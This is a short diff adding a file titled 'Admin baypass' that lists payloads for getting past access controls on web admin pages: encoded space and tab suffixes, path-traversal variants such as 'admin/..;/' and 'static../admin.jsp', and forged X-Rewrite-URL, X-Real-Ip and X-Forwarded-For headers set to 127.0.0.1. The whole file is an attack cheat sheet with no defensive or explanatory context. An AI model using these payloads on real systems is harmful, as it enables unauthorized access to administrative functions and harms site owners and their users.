@@ -1,0 +1,9 @@
+Admin baypass
+
+%20
+%09
+admin/..;/
+static../admin.jsp
+X-rewrite-URL: /admin
+X-Real-Ip;:127.0.0.1
+X-Forwarded-For:127.0.0.1
